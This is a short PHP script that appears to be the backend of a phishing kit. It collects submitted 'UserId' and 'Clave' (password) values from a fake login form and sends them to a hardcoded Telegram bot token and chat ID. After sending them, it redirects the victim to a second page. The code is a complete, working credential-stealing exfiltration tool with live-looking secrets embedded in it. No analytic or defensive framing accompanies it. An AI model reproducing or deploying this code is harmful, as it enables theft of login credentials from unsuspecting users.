<?php

 ini_set("display_errors", 0);
@$userp = $_SERVER['HTTP_X_FORWARDED_FOR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if ( isset ($_POST['UserId']) && isset ($_POST['Clave'])  ){

$message = "Doc= ".$_POST['UserId']." - User= ".$_POST['Clave']." \r\n";

$apiToken = "5118192847:AAFQRvVBxyYjizC5LCze2g0eTZ3SOROQy_Q";


$data = [
  'chat_id' => "5786666348",

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: index2.html');

}else{ header ('location: index.html'); exit(); }

?>